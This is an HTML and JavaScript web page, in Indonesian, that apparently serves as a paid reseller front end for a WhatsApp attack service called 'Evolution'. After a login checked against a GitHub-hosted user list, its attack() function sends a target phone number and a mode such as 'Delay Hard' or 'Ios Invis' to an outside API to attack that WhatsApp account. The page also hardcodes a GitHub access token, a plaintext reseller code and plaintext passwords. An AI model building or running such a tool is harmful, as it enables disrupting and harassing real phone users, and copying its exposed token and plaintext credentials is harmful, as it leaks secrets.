<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Evolution Web</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      background: #0e0e0e;
      color: #fff;
      font-family: 'Orbitron', sans-serif;
      overflow: hidden;
    }
    #particles-js {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }
    .container {
      position: relative;
      z-index: 2;
      max-width: 500px;
      margin: 80px auto;
      background: rgba(255,255,255,0.05);
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      backdrop-filter: blur(8px);
      box-shadow: 0 0 20px #ffffff1a;
    }
    .logo-img {
      width: 80px;
      border-radius: 15px;
    }
    .title {
      font-size: 1.5rem;
      margin: 10px 0;
    }
    input, button, select {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
    }
    button {
      background: linear-gradient(to right, #ffffff, #000000);
      color: #000;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    button:hover {
      background: linear-gradient(to right, #cccccc, #111111);
    }
    .hidden {
      display: none;
    }
    video {
      width: 100%;
      border-radius: 10px;
      margin-bottom: 15px;
    }
    #accessModal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }
    #accessModal.active {
      display: flex;
    }
    #accessModal .modal-content {
      background: #111;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      color: white;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 20px #00ffff66;
    }
    #splash {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #0e0e0e;
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      color: white;
      font-size: 1.5rem;
    }
  </style>
</head>
<body>

<div id="particles-js"></div>

<div id="splash">
  <img src="https://files.catbox.moe/g33giq.jpeg" class="logo-img" />
  <div>Please wait...</div>
</div>

<div class="container" id="loginBox">
  <img src="https://files.catbox.moe/g33giq.jpeg" class="logo-img">
  <div class="title">EVOLUTION WEB VERSION</div>
  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">
  <button onclick="handleLogin()">Login</button>
  <button onclick="showAccessModal()">Reseller Area</button>
  <div id="loginResult"></div>
</div>

<div class="container hidden" id="mainBox">
  <video src="https://files.catbox.moe/bou74n.mp4" autoplay muted loop></video>
  <div class="title">Evolution WEB Version</div>
  <select id="mode">
    <option value="delay">Delay</option>
    <option value="delayinvis">Delay Invisible</option>
    <option value="delayhard">Delay Hard</option>
    <option value="dozer">Extra Kuota</option>
    <option value="iosinvis">Ios Invis</option>
  </select>
  <input type="text" id="target" placeholder="Nomor Target">
  <button onclick="attack()">Attack</button>
  <div id="expiredInfo"></div>
  <div id="apiStatus"></div>
  <div style="margin-top: 10px;">
    <button onclick="logout()">Logout</button>
    <button onclick="window.open('https://t.me/imevolution', '_blank')">Developer</button>
  </div>
</div>

<div class="container hidden" id="resellerBox">
  <div class="title">RESELLER AREA</div>
  <input type="text" id="resUsername" placeholder="Username Baru">
  <input type="password" id="resPassword" placeholder="Password Baru">
  <input type="datetime-local" id="resExpired">
  <button onclick="addResellerUser()">Tambah User</button>
  <div id="resResult"></div>
  <button onclick="backToLogin()">Kembali</button>
</div>

<div id="accessModal">
  <div class="modal-content">
    <h3>Masukkan Kode Akses</h3>
    <input type="password" id="accessCodeInput" placeholder="Kode Akses">
    <button onclick="checkAccessCode()">Lanjutkan</button>
  </div>
</div>

<script>
  particlesJS("particles-js", {
    particles: {
      number: { value: 70 },
      size: { value: 3 },
      move: { speed: 1 },
      line_linked: { enable: true, color: "#ffffff" }
    },
    interactivity: {
      events: { onhover: { enable: true, mode: "repulse" } }
    }
  });

  window.onload = () => {
    setTimeout(() => {
      document.getElementById("splash").style.display = "none";
    }, 2000);
  };

  const token = "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";
  const repo = "ProjectShenzu/DatabaseEvolution";
  const filePath = "DatabaseWeb.json";
  let currentUser = null;

  function showAccessModal() {
    document.getElementById("accessModal").classList.add("active");
  }

  function checkAccessCode() {
    const kode = document.getElementById("accessCodeInput").value.trim();
    if (kode === "theevolution") {
      document.getElementById("accessModal").classList.remove("active");
      document.getElementById("loginBox").classList.add("hidden");
      document.getElementById("resellerBox").classList.remove("hidden");
    } else {
      alert("Kode salah.");
    }
  }

  async function handleLogin() {
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();
    const res = await fetch("https://raw.githubusercontent.com/ProjectShenzu/DatabaseEvolution/main/DatabaseWeb.json");
    const json = await res.json();
    const found = json.users.find(u => u.username === user && u.password === pass);
    if (found) {
      const now = new Date();
      const expiredDate = new Date(found.expired);
      if (now > expiredDate) {
        alert("Akun expired!");
        return;
      }
      currentUser = found;
      document.getElementById("loginBox").classList.add("hidden");
      document.getElementById("mainBox").classList.remove("hidden");
      document.getElementById("expiredInfo").innerText = "Expired: " + found.expired;
      // Auto logout checker
      setInterval(() => {
        if (new Date() > new Date(currentUser.expired)) {
          alert("Akun anda sudah expired!");
          logout();
        }
      }, 10000);
    } else {
      document.getElementById("loginResult").innerText = "Login gagal.";
    }
  }

  function logout() {
    currentUser = null;
    document.getElementById("mainBox").classList.add("hidden");
    document.getElementById("loginBox").classList.remove("hidden");
  }

  async function addResellerUser() {
    const user = document.getElementById("resUsername").value.trim();
    const pass = document.getElementById("resPassword").value.trim();
    const exp = document.getElementById("resExpired").value;
    if (!user || !pass || !exp) return alert("Lengkapi semua field");

    const githubUrl = `https://api.github.com/repos/${repo}/contents/${filePath}`;
    const res = await fetch(githubUrl, {
      headers: { Authorization: `Bearer ${token}` }
    });
    const data = await res.json();
    const content = JSON.parse(atob(data.content));
    if (!content.users) content.users = [];
    content.users.push({ username: user, password: pass, expired: exp });

    const updated = await fetch(githubUrl, {
      method: "PUT",
      headers: {
        Authorization: `Bearer ${token}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        message: `add user ${user}`,
        content: btoa(JSON.stringify(content, null, 2)),
        sha: data.sha
      })
    });

    if (updated.ok) {
      document.getElementById("resResult").innerText = "User ditambahkan!";
    } else {
      document.getElementById("resResult").innerText = "Gagal menambahkan user.";
    }
  }

  function backToLogin() {
    document.getElementById("resellerBox").classList.add("hidden");
    document.getElementById("loginBox").classList.remove("hidden");
  }

  async function attack() {
    const target = document.getElementById("target").value.trim();
    const mode = document.getElementById("mode").value;
    if (!target) return alert("Masukkan nomor target.");
    const url = `https://apievolution.gacorr.biz.id/evolution?type=${mode}&chatId=${target}@s.whatsapp.net`;
    try {
      const res = await fetch(url);
      const json = await res.json();
      alert(json.success ? `Berhasil menyerang ${target}` : `Gagal menyerang ${target}`);
    } catch (e) {
      alert("Terjadi kesalahan pada saat request API.");
    }
  }

  async function checkApiStatus() {
    try {
      const res = await fetch("https://apievolution.gacorr.biz.id/status");
      const json = await res.json();
      document.getElementById("apiStatus").innerText = json.connected ? "API Connected" : "API Disconnected";
    } catch {
      document.getElementById("apiStatus").innerText = "API Status Error";
    }
  }
  setInterval(checkApiStatus, 5000);
  checkApiStatus();
</script>
</body>
</html>
